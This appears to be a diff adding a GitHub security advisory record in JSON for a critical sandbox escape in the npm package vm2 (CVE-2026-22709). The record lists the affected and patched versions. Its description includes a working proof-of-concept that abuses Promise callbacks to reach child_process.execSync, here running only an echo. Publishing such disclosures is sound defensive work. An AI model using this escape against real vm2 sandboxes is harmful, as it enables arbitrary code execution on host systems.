@@ -1,0 +1,56 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-01-26T18:57:15Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "vm2"
+  },
+  "Advisory": {
+    "DatabaseId": 334151,
+    "Id": "GSA_kwCzR0hTQS05OXA3LTZ2NXctN3hnOM4ABRlH",
+    "GhsaId": "GHSA-99p7-6v5w-7xg8",
+    "References": [
+      {
+        "Url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-99p7-6v5w-7xg8"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/commit/4b009c2d4b1131c01810c1205e641d614c322a29"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/releases/tag/v3.10.2"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-99p7-6v5w-7xg8"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-99p7-6v5w-7xg8"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-22709"
+      }
+    ],
+    "Description": "In vm2 for version 3.10.0, `Promise.prototype.then` `Promise.prototype.catch` callback sanitization can be bypassed. This allows attackers to escape the sandbox and run arbitrary code.\n\n```js\nconst { VM } = require(\"vm2\");\n\nconst code = `\nconst error = new Error();\nerror.name = Symbol();\nconst f = async () =\u003e error.stack;\nconst promise = f();\npromise.catch(e =\u003e {\n    const Error = e.constructor;\n    const Function = Error.constructor;\n    const f = new Function(\n        \"process.mainModule.require('child_process').execSync('echo HELLO WORLD!', { stdio: 'inherit' })\"\n    );\n    f();\n});\n`;\n\nnew VM().run(code);\n```\n\nIn lib/setup-sandbox.js, the callback function of `localPromise.prototype.then` is sanitized, but `globalPromise.prototype.then` is not sanitized. The return value of async functions is `globalPromise` object.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-01-26T18:57:14Z",
+    "Severity": "CRITICAL",
+    "Summary": "vm2 has a Sandbox Escape",
+    "UpdatedAt": "2026-01-26T18:57:15Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 9.8,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.10.2"
+      },
+      "VulnerableVersionRange": "\u003c= 3.10.1"
+    }
+  ]
+}
